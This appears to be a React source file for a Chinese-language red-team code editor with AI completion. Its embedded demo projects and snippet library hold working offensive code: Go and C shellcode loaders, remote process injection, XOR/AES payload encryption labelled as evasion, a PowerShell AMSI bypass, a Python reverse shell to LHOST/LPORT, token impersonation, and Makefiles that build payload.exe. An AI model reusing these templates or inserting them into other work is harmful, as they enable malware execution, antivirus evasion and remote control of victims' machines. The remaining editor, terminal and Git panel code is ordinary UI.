import { useState, useRef, useEffect, useCallback } from "react";
import Editor, { type Monaco } from "@monaco-editor/react";
import { trpc } from "@/lib/trpc";
import { useApp } from "@/contexts/AppContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import {
  FileCode, FolderOpen, FolderClosed, Plus, X, Save, Terminal, GitBranch,
  Bot, Code2, Layers, Package, Zap, RefreshCw, Sparkles,
  ChevronRight, ChevronDown, Copy, GitCommit, Settings,
  CheckCircle2, Circle, Hash, HardDrive, Shield
} from "lucide-react";
import {
  ContextMenu, ContextMenuContent, ContextMenuItem,
  ContextMenuSeparator, ContextMenuTrigger, ContextMenuSub,
  ContextMenuSubContent, ContextMenuSubTrigger
} from "@/components/ui/context-menu";
import {
  ResizableHandle, ResizablePanel, ResizablePanelGroup
} from "@/components/ui/resizable";

// ─── Demo project file trees ───────────────────────────────────────────────
const DEMO_PROJECTS_FILES: Record<number, {
  name: string; platform: string; language: string;
  files: Array<{ id: number; name: string; path: string; language: string; content: string; isDir?: boolean; children?: number[] }>
}> = {
  101: {
    name: "Operation-Phantom",
    platform: "windows",
    language: "go",
    files: [
      { id: 1, name: "main.go", path: "/main.go", language: "go", content: `package main\n\nimport (\n\t"fmt"\n\t"os"\n\t"syscall"\n\t"unsafe"\n)\n\n// Shellcode loader - authorized research only\nfunc main() {\n\tshellcode := []byte{\n\t\t0x90, 0x90, 0x90, // NOP sled\n\t}\n\n\taddr, err := syscall.VirtualAlloc(\n\t\t0,\n\t\tuintptr(len(shellcode)),\n\t\tsyscall.MEM_COMMIT|syscall.MEM_RESERVE,\n\t\tsyscall.PAGE_EXECUTE_READWRITE,\n\t)\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, "VirtualAlloc failed: %v\\n", err)\n\t\tos.Exit(1)\n\t}\n\n\tcopy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n}` },
      { id: 2, name: "loader.go", path: "/loader.go", language: "go", content: `package main\n\nimport (\n\t"syscall"\n\t"unsafe"\n)\n\n// ReflectiveLoader implements reflective DLL injection\nfunc ReflectiveLoader(shellcode []byte) error {\n\taddr, err := syscall.VirtualAlloc(\n\t\t0, uintptr(len(shellcode)),\n\t\tsyscall.MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE,\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\tcopy((*[1<<30]byte)(unsafe.Pointer(addr))[:], shellcode)\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n\treturn nil\n}` },
      { id: 3, name: "evasion.go", path: "/evasion.go", language: "go", content: `package main\n\nimport "crypto/aes"\nimport "crypto/cipher"\n\n// XOREncrypt encrypts shellcode with XOR\nfunc XOREncrypt(data []byte, key byte) []byte {\n\tresult := make([]byte, len(data))\n\tfor i, b := range data {\n\t\tresult[i] = b ^ key\n\t}\n\treturn result\n}\n\n// AESEncrypt encrypts data with AES-256-CBC\nfunc AESEncrypt(data, key []byte) ([]byte, error) {\n\tblock, err := aes.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tgcm, err := cipher.NewGCM(block)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tnonce := make([]byte, gcm.NonceSize())\n\treturn gcm.Seal(nonce, nonce, data, nil), nil\n}` },
      { id: 4, name: "go.mod", path: "/go.mod", language: "go", content: `module operation-phantom\n\ngo 1.21\n` },
      { id: 5, name: "Makefile", path: "/Makefile", language: "makefile", content: `# Build targets\nWINDOWS_X64 = GOOS=windows GOARCH=amd64\nLINUX_X64 = GOOS=linux GOARCH=amd64\n\nbuild-windows:\n\t$(WINDOWS_X64) go build -ldflags="-s -w" -o dist/payload.exe .\n\nbuild-linux:\n\t$(LINUX_X64) go build -ldflags="-s -w" -o dist/payload .\n\nclean:\n\trm -rf dist/\n` },
    ]
  },
  102: {
    name: "APT-Simulation-2024",
    platform: "linux",
    language: "c",
    files: [
      { id: 10, name: "loader.c", path: "/loader.c", language: "c", content: `#include <windows.h>\n#include <stdio.h>\n\nunsigned char shellcode[] = {\n    0x90, 0x90, 0x90\n};\n\nint main() {\n    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),\n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (!pMem) return 1;\n    memcpy(pMem, shellcode, sizeof(shellcode));\n    HANDLE hThread = CreateThread(NULL, 0,\n        (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}` },
      { id: 11, name: "inject.c", path: "/inject.c", language: "c", content: `#include <windows.h>\n\nBOOL InjectShellcode(DWORD pid, LPVOID shellcode, SIZE_T size) {\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (!hProcess) return FALSE;\n    \n    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, size,\n        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    WriteProcessMemory(hProcess, pRemote, shellcode, size, NULL);\n    \n    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,\n        (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n    return TRUE;\n}` },
      { id: 12, name: "Makefile", path: "/Makefile", language: "makefile", content: `CC = x86_64-w64-mingw32-gcc\nCFLAGS = -O2 -s\n\nall: loader.exe inject.exe\n\nloader.exe: loader.c\n\t$(CC) $(CFLAGS) -o $@ $^\n\ninject.exe: inject.c\n\t$(CC) $(CFLAGS) -o $@ $^\n` },
    ]
  },
};

const SNIPPETS = [
  { name: "Shellcode Loader (Go)", lang: "go", category: "loader", code: `func loadShellcode(sc []byte) {\n\taddr, _ := syscall.VirtualAlloc(0, uintptr(len(sc)), syscall.MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)\n\tcopy((*[1<<30]byte)(unsafe.Pointer(addr))[:], sc)\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n}` },
  { name: "Process Injection (C)", lang: "c", category: "injection", code: `HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(hProc, pMem, shellcode, size, NULL);\nCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);` },
  { name: "AMSI Bypass (PS)", lang: "powershell", category: "evasion", code: `$a=[Ref].Assembly.GetTypes()\nForeach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}\n$d=$c.GetFields('NonPublic,Static')\nForeach($e in $d){if($e.Name -like "*Context"){$f=$e}}\n$g=$f.GetValue($null)\n[IntPtr]$ptr=$g\n[Int32[]]$buf=@(0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)` },
  { name: "Rev Shell (Python)", lang: "python", category: "shell", code: `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("LHOST",LPORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])` },
  { name: "XOR Encrypt (C)", lang: "c", category: "evasion", code: `void xor_encrypt(unsigned char* data, int len, unsigned char key) {\n    for (int i = 0; i < len; i++) data[i] ^= key;\n}` },
  { name: "Token Impersonation (C)", lang: "c", category: "privesc", code: `HANDLE hToken = NULL;\nOpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);\nHANDLE hDup = NULL;\nDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);\nImpersonateLoggedOnUser(hDup);` },
];

const GIT_CHANGES = [
  { file: "main.go", status: "M", lines: "+12 -3" },
  { file: "loader.go", status: "A", lines: "+48 -0" },
  { file: "evasion.go", status: "M", lines: "+5 -2" },
];

// ─── Terminal ──────────────────────────────────────────────────────────────
function TerminalPanel({ visible, projectName }: { visible: boolean; projectName: string }) {
  const [lines, setLines] = useState([
    { type: "info", text: `渗透测试工具开发系统 — 终端 v1.0` },
    { type: "info", text: `项目: ${projectName} · Go 1.21 · GCC 12.3` },
    { type: "prompt", text: "" },
  ]);
  const [input, setInput] = useState("");
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const handleCommand = (cmd: string) => {
    const newLines = [...lines.slice(0, -1), { type: "cmd", text: `$ ${cmd}` }];
    const cmds: Record<string, string[]> = {
      help: ["可用命令: help, clear, build, run, ls, pwd, whoami, go build, gcc"],
      ls: ["main.go  loader.go  evasion.go  go.mod  Makefile"],
      pwd: [`/workspace/${projectName.toLowerCase().replace(/\s+/g, "-")}`],
      whoami: ["redteam-operator"],
      "go build": ["[+] 编译中...", "[+] go build -ldflags='-s -w' -o dist/payload.exe .", "[✓] 构建成功: dist/payload.exe (156KB)"],
      build: ["[+] 启动构建流水线...", "[+] 编译...", "[+] 混淆处理...", "[+] 打包...", "[✓] 构建完成 · 耗时 8.4s"],
      clear: [],
    };
    if (cmd === "clear") { setLines([{ type: "prompt", text: "" }]); setInput(""); return; }
    const output = cmds[cmd] ?? [`bash: ${cmd}: 命令未找到`];
    output.forEach(line => newLines.push({ type: line.startsWith("[✓]") ? "success" : line.startsWith("[+]") ? "info" : line.startsWith("bash:") ? "error" : "output", text: line }));
    newLines.push({ type: "prompt", text: "" });
    setLines(newLines);
    setInput("");
  };

  if (!visible) return null;

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)] font-mono text-xs dark-scroll">
      <div className="flex items-center gap-2 px-3 py-1.5 border-b border-[var(--editor-border)] shrink-0 bg-[var(--editor-tab)]">
        <Terminal className="w-3 h-3 text-green-400" />
        <span className="text-green-400 text-[11px] font-semibold">终端 — {projectName}</span>
        <div className="ml-auto flex gap-1.5">
          <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
        </div>
      </div>
      <ScrollArea className="flex-1 p-3">
        {lines.map((line, i) => (
          <div key={i} className={cn("leading-5 mb-0.5",
            line.type === "error" ? "text-red-400" : line.type === "success" ? "text-green-400" :
            line.type === "info" ? "text-blue-400" : line.type === "cmd" ? "text-yellow-300" : "text-[var(--editor-fg)]"
          )}>
            {line.type === "prompt" ? (
              <div className="flex items-center">
                <span className="text-green-400 mr-1">❯</span>
                <input value={input} onChange={e => setInput(e.target.value)}
                  onKeyDown={e => { if (e.key === "Enter") handleCommand(input); }}
                  className="flex-1 bg-transparent outline-none text-[var(--editor-fg)] caret-green-400" autoFocus />
              </div>
            ) : <span>{line.text}</span>}
          </div>
        ))}
        <div ref={endRef} />
      </ScrollArea>
    </div>
  );
}

// ─── Git Panel ─────────────────────────────────────────────────────────────
function GitPanel({ visible }: { visible: boolean }) {
  const [commitMsg, setCommitMsg] = useState("");
  if (!visible) return null;
  return (
    <div className="h-full flex flex-col bg-[#0f1117] border-l border-[var(--editor-border)]">
      <div className="flex items-center gap-2 px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
        <GitBranch className="w-3.5 h-3.5 text-orange-400" />
        <span className="text-[11px] text-white font-semibold">Git — main</span>
      </div>
      <ScrollArea className="flex-1 p-2">
        <p className="text-[10px] text-[var(--sidebar-section)] uppercase tracking-widest font-bold px-1 mb-2">变更文件</p>
        {GIT_CHANGES.map(f => (
          <div key={f.file} className="flex items-center gap-2 px-2 py-1.5 rounded-lg hover:bg-[var(--sidebar-hover)] cursor-pointer group">
            <span className={cn("text-[10px] font-bold w-4 shrink-0", f.status === "M" ? "text-yellow-400" : "text-green-400")}>{f.status}</span>
            <span className="text-[11px] text-[var(--sidebar-fg)] font-mono flex-1 truncate">{f.file}</span>
            <span className="text-[10px] text-green-400 opacity-0 group-hover:opacity-100">{f.lines}</span>
          </div>
        ))}
        <div className="mt-3 px-1">
          <input value={commitMsg} onChange={e => setCommitMsg(e.target.value)} placeholder="提交信息..."
            className="w-full bg-[var(--editor-line)] border border-[var(--editor-border)] rounded-lg px-2 py-1.5 text-[11px] text-[var(--editor-fg)] outline-none focus:border-[var(--primary)] placeholder:text-[var(--sidebar-section)]" />
          <Button size="sm" className="w-full mt-2 h-7 text-xs bg-grad-primary border-0"
            onClick={() => { toast.success("已提交: " + (commitMsg || "Update")); setCommitMsg(""); }}>
            <GitCommit className="w-3 h-3 mr-1.5" /> 提交
          </Button>
        </div>
      </ScrollArea>
    </div>
  );
}

// ─── AI Inline Completion ──────────────────────────────────────────────────
function useAIInlineCompletion(editorRef: React.MutableRefObject<any>, monacoRef: React.MutableRefObject<Monaco | null>, language: string, enabled: boolean) {
  const [ghostText, setGhostText] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
  const decorationsRef = useRef<string[]>([]);

  const completeMutation = trpc.ai.complete.useMutation({
    onSuccess: (data) => {
      setIsLoading(false);
      if (!data.completion || !editorRef.current || !monacoRef.current) return;
      const rawCompletion = typeof data.completion === "string" ? data.completion : String(data.completion ?? "");
      const completion = rawCompletion.replace(/^```[\w]*\n?/, "").replace(/\n?```$/, "").trim();
      if (!completion) return;
      setGhostText(completion);
      const editor = editorRef.current;
      const monaco = monacoRef.current;
      const position = editor.getPosition();
      if (!position) return;
      decorationsRef.current = editor.deltaDecorations(decorationsRef.current, []);
      decorationsRef.current = editor.deltaDecorations([], [{
        range: new monaco.Range(position.lineNumber, position.column, position.lineNumber, position.column),
        options: { after: { content: completion.split("\n")[0], inlineClassName: "ai-ghost-text" }, description: "ai-completion" },
      }]);
    },
    onError: () => { setIsLoading(false); setGhostText(null); },
  });

  const clearGhost = useCallback(() => {
    setGhostText(null);
    if (editorRef.current) decorationsRef.current = editorRef.current.deltaDecorations(decorationsRef.current, []);
  }, [editorRef]);

  const triggerCompletion = useCallback((code: string, cursorPosition: number) => {
    if (!enabled) return;
    clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      if (code.length < 10) return;
      setIsLoading(true);
      completeMutation.mutate({ code, language, cursorPosition });
    }, 1200);
  }, [enabled, language, completeMutation]);

  const acceptCompletion = useCallback(() => {
    if (!ghostText || !editorRef.current) return false;
    const editor = editorRef.current;
    const position = editor.getPosition();
    if (!position) return false;
    editor.executeEdits("ai-accept", [{
      range: { startLineNumber: position.lineNumber, startColumn: position.column, endLineNumber: position.lineNumber, endColumn: position.column },
      text: ghostText,
    }]);
    clearGhost();
    toast.success("AI 补全已接受", { duration: 1500 });
    return true;
  }, [ghostText, editorRef, clearGhost]);

  return { ghostText, isLoading, triggerCompletion, acceptCompletion, clearGhost };
}

// ─── Main Editor ───────────────────────────────────────────────────────────
export default function CodeEditor() {
  const { activeProjectId, setAssistantContext, setActiveModule } = useApp();
  const [selectedProjectId, setSelectedProjectId] = useState<number>(activeProjectId ?? 101);
  const [openTabs, setOpenTabs] = useState<number[]>([]);
  const [activeTab, setActiveTab] = useState<number | null>(null);
  const [showTerminal, setShowTerminal] = useState(false);
  const [showSnippets, setShowSnippets] = useState(false);
  const [showGit, setShowGit] = useState(false);
  const [aiEnabled, setAiEnabled] = useState(true);
  const [snippetCategory, setSnippetCategory] = useState("all");
  const [fileContents, setFileContents] = useState<Record<number, string>>({});
  const [aiLoading, setAiLoading] = useState(false);
  const [expandedFolders, setExpandedFolders] = useState<Set<string>>(new Set(["root"]));
  const editorRef = useRef<any>(null);
  const monacoRef = useRef<Monaco | null>(null);

  // Load projects
  const { data: dbProjects = [] } = trpc.projects.list.useQuery({});
  const { data: dbFiles = [] } = trpc.projects.getFiles.useQuery({ projectId: selectedProjectId }, { enabled: !!selectedProjectId });

  // Get current project data
  const currentProjectData = DEMO_PROJECTS_FILES[selectedProjectId];
  const currentProject = (dbProjects as any[]).find((p: any) => p.id === selectedProjectId) ?? { name: currentProjectData?.name ?? "未选择项目", platform: currentProjectData?.platform ?? "windows", language: currentProjectData?.language ?? "go" };

  // Use DB files if available, else demo files
  const projectFiles = dbFiles.length > 0
    ? dbFiles.map((f: any) => ({ id: f.id, name: f.name, path: f.path, language: f.language ?? "text", content: f.content ?? "" }))
    : (currentProjectData?.files ?? []);

  // Initialize tabs with first file
  useEffect(() => {
    if (projectFiles.length > 0 && openTabs.length === 0) {
      setOpenTabs([projectFiles[0].id]);
      setActiveTab(projectFiles[0].id);
      setFileContents(Object.fromEntries(projectFiles.map(f => [f.id, f.content])));
    }
  }, [selectedProjectId, projectFiles.length]);

  // Update project when activeProjectId changes
  useEffect(() => {
    if (activeProjectId && activeProjectId !== selectedProjectId) {
      setSelectedProjectId(activeProjectId);
      setOpenTabs([]);
      setActiveTab(null);
    }
  }, [activeProjectId]);

  const activeFile = projectFiles.find(f => f.id === activeTab);

  const { ghostText, isLoading: completionLoading, triggerCompletion, acceptCompletion, clearGhost } = useAIInlineCompletion(editorRef, monacoRef, activeFile?.language ?? "go", aiEnabled);

  const aiOp = trpc.ai.codeOperation.useMutation({
    onSuccess: (data) => {
      const rawContent = data.content;
      const contentStr = typeof rawContent === "string" ? rawContent : String(rawContent ?? "");
      if (editorRef.current && activeTab) {
        const editor = editorRef.current;
        const selection = editor.getSelection();
        if (selection) {
          editor.executeEdits("ai-op", [{
            range: { startLineNumber: selection.endLineNumber + 1, startColumn: 1, endLineNumber: selection.endLineNumber + 1, endColumn: 1 },
            text: `\n/* ── AI Result ──\n${contentStr}\n*/\n`,
          }]);
        }
      }
      toast.success("AI 操作完成");
      setAiLoading(false);
    },
    onError: () => { toast.error("AI 操作失败"); setAiLoading(false); },
  });

  const saveFileMutation = trpc.projects.saveFile.useMutation({
    onSuccess: () => toast.success("文件已保存"),
    onError: () => toast.error("保存失败"),
  });

  const handleEditorMount = (editor: any, monaco: Monaco) => {
    editorRef.current = editor;
    monacoRef.current = monaco;

    monaco.editor.defineTheme("pentest-dark", {
      base: "vs-dark", inherit: true,
      rules: [
        { token: "comment", foreground: "5c6370", fontStyle: "italic" },
        { token: "keyword", foreground: "c678dd" },
        { token: "string", foreground: "98c379" },
        { token: "number", foreground: "d19a66" },
        { token: "type", foreground: "56b6c2" },
        { token: "function", foreground: "61afef" },
      ],
      colors: {
        "editor.background": "#13141f",
        "editor.foreground": "#abb2bf",
        "editor.lineHighlightBackground": "#1e2030",
        "editorLineNumber.foreground": "#3b4048",
        "editorLineNumber.activeForeground": "#6366f1",
        "editor.selectionBackground": "#3e4451",
        "editorCursor.foreground": "#6366f1",
      },
    });
    monaco.editor.setTheme("pentest-dark");

    const style = document.createElement("style");
    style.textContent = `.ai-ghost-text { color: #5c6370 !important; font-style: italic; }`;
    document.head.appendChild(style);

    editor.addCommand(monaco.KeyCode.Tab, () => { if (ghostText) { acceptCompletion(); } else { editor.trigger("keyboard", "tab", {}); } });
    editor.addCommand(monaco.KeyCode.Escape, () => { clearGhost(); });
    editor.onDidChangeModelContent(() => {
      const model = editor.getModel();
      const pos = editor.getPosition();
      if (model && pos) triggerCompletion(model.getValue(), model.getOffsetAt(pos));
    });
  };

  const handleAiOperation = (op: "explain" | "obfuscate" | "deobfuscate" | "rewrite" | "audit") => {
    const selection = editorRef.current?.getSelection();
    const model = editorRef.current?.getModel();
    const code = (selection && model && !selection.isEmpty()) ? model.getValueInRange(selection) : (activeTab ? fileContents[activeTab] : "") ?? "";
    if (!code) { toast.warning("请先选择代码"); return; }
    setAiLoading(true);
    clearGhost();
    aiOp.mutate({ operation: op, code, language: activeFile?.language });
  };

  const handleSaveFile = () => {
    if (!activeFile || !activeTab) return;
    const content = fileContents[activeTab] ?? activeFile.content;
    saveFileMutation.mutate({
      projectId: selectedProjectId,
      name: activeFile.name,
      path: activeFile.path,
      content,
      language: activeFile.language,
    });
  };

  const openTab = (fileId: number) => {
    if (!openTabs.includes(fileId)) setOpenTabs(prev => [...prev, fileId]);
    setActiveTab(fileId);
    // Load content if not already loaded
    const file = projectFiles.find(f => f.id === fileId);
    if (file && !fileContents[fileId]) {
      setFileContents(prev => ({ ...prev, [fileId]: file.content }));
    }
  };

  const closeTab = (fileId: number, e: React.MouseEvent) => {
    e.stopPropagation();
    const newTabs = openTabs.filter(id => id !== fileId);
    setOpenTabs(newTabs);
    if (activeTab === fileId) setActiveTab(newTabs.length > 0 ? newTabs[newTabs.length - 1] : null);
  };

  const filteredSnippets = snippetCategory === "all" ? SNIPPETS : SNIPPETS.filter(s => s.category === snippetCategory);

  const langColors: Record<string, string> = {
    go: "text-cyan-400", c: "text-blue-400", cpp: "text-blue-300",
    python: "text-yellow-400", powershell: "text-indigo-400",
    rust: "text-orange-400", makefile: "text-gray-400", text: "text-gray-400"
  };

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)]">
      {/* Toolbar */}
      <div className="flex items-center gap-1 px-3 py-1.5 border-b border-[var(--editor-border)] bg-[var(--editor-tab)] shrink-0">
        {/* Project selector */}
        <Select value={String(selectedProjectId)} onValueChange={v => { setSelectedProjectId(parseInt(v)); setOpenTabs([]); setActiveTab(null); }}>
          <SelectTrigger className="w-48 h-7 text-xs bg-[var(--editor-line)] border-[var(--editor-border)] text-[var(--editor-fg)] hover:bg-[var(--sidebar-hover)]">
            <div className="flex items-center gap-1.5">
              <FolderOpen className="w-3 h-3 text-amber-400 shrink-0" />
              <SelectValue />
            </div>
          </SelectTrigger>
          <SelectContent>
            {Object.entries(DEMO_PROJECTS_FILES).map(([id, proj]) => (
              <SelectItem key={id} value={id}>
                <div className="flex items-center gap-2">
                  <FolderOpen className="w-3.5 h-3.5 text-amber-400" />
                  <span className="font-mono text-sm">{proj.name}</span>
                </div>
              </SelectItem>
            ))}
            {(dbProjects as any[]).map((p: any) => (
              <SelectItem key={p.id} value={String(p.id)}>
                <div className="flex items-center gap-2">
                  <FolderOpen className="w-3.5 h-3.5 text-indigo-400" />
                  <span className="font-mono text-sm">{p.name}</span>
                </div>
              </SelectItem>
            ))}
          </SelectContent>
        </Select>

        <div className="w-px h-4 bg-[var(--editor-border)] mx-1" />

        <div className="flex items-center gap-0.5">
          {[
            { icon: Layers, label: "片段库", active: showSnippets, toggle: () => setShowSnippets(!showSnippets) },
            { icon: Terminal, label: "终端", active: showTerminal, toggle: () => setShowTerminal(!showTerminal) },
            { icon: GitBranch, label: "Git", active: showGit, toggle: () => setShowGit(!showGit) },
          ].map((item, i) => (
            <Button key={i} variant="ghost" size="icon" title={item.label}
              className={cn("w-7 h-7 text-[var(--editor-fg)] hover:bg-[var(--editor-line)]", item.active && "bg-[var(--editor-line)] text-white")}
              onClick={item.toggle}>
              <item.icon className="w-3.5 h-3.5" />
            </Button>
          ))}
        </div>

        <div className="w-px h-4 bg-[var(--editor-border)] mx-1" />

        <div className="flex items-center gap-0.5">
          {[
            { label: "解释", op: "explain" as const, color: "text-blue-400" },
            { label: "混淆", op: "obfuscate" as const, color: "text-amber-400" },
            { label: "反混淆", op: "deobfuscate" as const, color: "text-green-400" },
            { label: "重写", op: "rewrite" as const, color: "text-purple-400" },
            { label: "审计", op: "audit" as const, color: "text-red-400" },
          ].map(item => (
            <Button key={item.op} variant="ghost" size="sm"
              className={cn("h-6 px-2 text-[10px] hover:bg-[var(--editor-line)] gap-1", item.color)}
              onClick={() => handleAiOperation(item.op)} disabled={aiLoading}>
              <Bot className="w-3 h-3" />{item.label}
            </Button>
          ))}
        </div>

        <div className="ml-auto flex items-center gap-1.5">
          <button onClick={() => setAiEnabled(!aiEnabled)}
            className={cn("flex items-center gap-1.5 px-2 py-1 rounded-lg text-[10px] font-medium transition-all border",
              aiEnabled ? "bg-purple-900/40 text-purple-300 border-purple-700" : "bg-[var(--editor-line)] text-[var(--sidebar-fg)] border-[var(--editor-border)]"
            )}>
            <Sparkles className={cn("w-3 h-3", aiEnabled && "animate-pulse")} />
            AI {aiEnabled ? "ON" : "OFF"}
          </button>

          {ghostText && (
            <div className="flex items-center gap-1 text-[10px] text-purple-300 bg-purple-900/30 px-2 py-0.5 rounded border border-purple-700">
              <Sparkles className="w-3 h-3" />
              <span>Tab 接受</span>
              <button onClick={clearGhost} className="ml-1 hover:text-white"><X className="w-3 h-3" /></button>
            </div>
          )}

          <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-blue-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={() => { setAssistantContext({ fileContent: activeTab ? fileContents[activeTab] : "", fileName: activeFile?.name }); setActiveModule("assistant"); toast.success("已发送到 AI 助手"); }}>
            <Bot className="w-3 h-3" />助手
          </Button>

          <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-green-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={handleSaveFile} disabled={saveFileMutation.isPending}>
            <Save className="w-3 h-3" />保存
          </Button>
        </div>
      </div>

      <ResizablePanelGroup direction="horizontal" className="flex-1">
        {/* File Tree with Project Name */}
        <ResizablePanel defaultSize={16} minSize={12} maxSize={25}>
          <div className="h-full flex flex-col bg-[#0d0e1a] border-r border-[var(--editor-border)]">
            {/* Project header */}
            <div className="px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
              <div className="flex items-center gap-2 mb-1">
                <FolderOpen className="w-4 h-4 text-amber-400 shrink-0" />
                <span className="text-[11px] text-white font-bold truncate">{currentProject.name}</span>
              </div>
              <div className="flex items-center gap-1.5">
                <Badge className={cn("text-[9px] h-3.5 px-1",
                  currentProject.platform === "windows" ? "bg-blue-900/60 text-blue-300" :
                  currentProject.platform === "linux" ? "bg-orange-900/60 text-orange-300" :
                  "bg-purple-900/60 text-purple-300"
                )}>{currentProject.platform}</Badge>
                <Badge className="text-[9px] h-3.5 px-1 bg-gray-800 text-gray-300 font-mono">{currentProject.language}</Badge>
              </div>
            </div>

            {/* File tree */}
            <ScrollArea className="flex-1">
              <div className="p-1.5 space-y-0.5">
                {/* Root folder */}
                <div className="flex items-center gap-1 px-2 py-1 text-[var(--sidebar-fg)] opacity-70 cursor-pointer hover:opacity-100"
                  onClick={() => setExpandedFolders(prev => { const next = new Set(prev); next.has("root") ? next.delete("root") : next.add("root"); return next; })}>
                  {expandedFolders.has("root") ? <ChevronDown className="w-3 h-3" /> : <ChevronRight className="w-3 h-3" />}
                  <FolderOpen className="w-3.5 h-3.5 text-amber-400" />
                  <span className="text-[11px] font-semibold truncate">{currentProject.name}</span>
                </div>

                {expandedFolders.has("root") && projectFiles.map(file => (
                  <ContextMenu key={file.id}>
                    <ContextMenuTrigger>
                      <button onClick={() => openTab(file.id)}
                        className={cn("w-full flex items-center gap-1.5 pl-5 pr-2 py-1.5 rounded-lg text-[11px] text-left transition-all",
                          activeTab === file.id ? "bg-[var(--sidebar-active-bg)] text-white" : "text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)] hover:text-white"
                        )}>
                        <FileCode className={cn("w-3 h-3 shrink-0", langColors[file.language] ?? "text-gray-400")} />
                        <span className="truncate font-mono">{file.name}</span>
                      </button>
                    </ContextMenuTrigger>
                    <ContextMenuContent className="text-xs">
                      <ContextMenuItem onClick={() => openTab(file.id)}>打开</ContextMenuItem>
                      <ContextMenuItem onClick={() => { navigator.clipboard.writeText(fileContents[file.id] ?? file.content); toast.success("已复制"); }}>复制内容</ContextMenuItem>
                      <ContextMenuSeparator />
                      <ContextMenuItem className="text-destructive">删除</ContextMenuItem>
                    </ContextMenuContent>
                  </ContextMenu>
                ))}

                {projectFiles.length === 0 && (
                  <div className="px-4 py-6 text-center">
                    <p className="text-[10px] text-[var(--sidebar-section)]">暂无文件</p>
                    <p className="text-[9px] text-[var(--sidebar-section)] mt-1">从 AI 助手保存代码到此项目</p>
                  </div>
                )}
              </div>
            </ScrollArea>

            {/* Add file button */}
            <div className="p-2 border-t border-[var(--editor-border)] shrink-0">
              <button onClick={() => toast.info("新建文件即将上线")}
                className="w-full flex items-center gap-1.5 px-2 py-1.5 rounded-lg text-[10px] text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)] hover:text-white transition-colors">
                <Plus className="w-3 h-3" /> 新建文件
              </button>
            </div>
          </div>
        </ResizablePanel>

        <ResizableHandle className="bg-[var(--editor-border)] w-px" />

        {/* Editor Area */}
        <ResizablePanel defaultSize={showSnippets ? 64 : showGit ? 67 : 84}>
          <div className="h-full flex flex-col">
            {/* Tabs */}
            <div className="flex items-center bg-[var(--editor-tab)] border-b border-[var(--editor-border)] overflow-x-auto shrink-0">
              {openTabs.length === 0 ? (
                <div className="flex items-center gap-2 px-4 py-2 text-[var(--sidebar-section)] text-xs">
                  <FileCode className="w-3.5 h-3.5" />
                  <span>点击左侧文件打开</span>
                </div>
              ) : (
                openTabs.map(tabId => {
                  const file = projectFiles.find(f => f.id === tabId);
                  if (!file) return null;
                  return (
                    <div key={tabId} onClick={() => setActiveTab(tabId)}
                      className={cn("flex items-center gap-1.5 px-3 py-2 text-[11px] cursor-pointer border-r border-[var(--editor-border)] shrink-0 group transition-colors",
                        activeTab === tabId ? "bg-[var(--editor-bg)] text-white border-t-2 border-t-[var(--primary)]" : "text-[var(--sidebar-fg)] hover:bg-[var(--editor-bg)]/60"
                      )}>
                      <FileCode className={cn("w-3 h-3", langColors[file.language] ?? "text-gray-400")} />
                      <span className="font-mono">{file.name}</span>
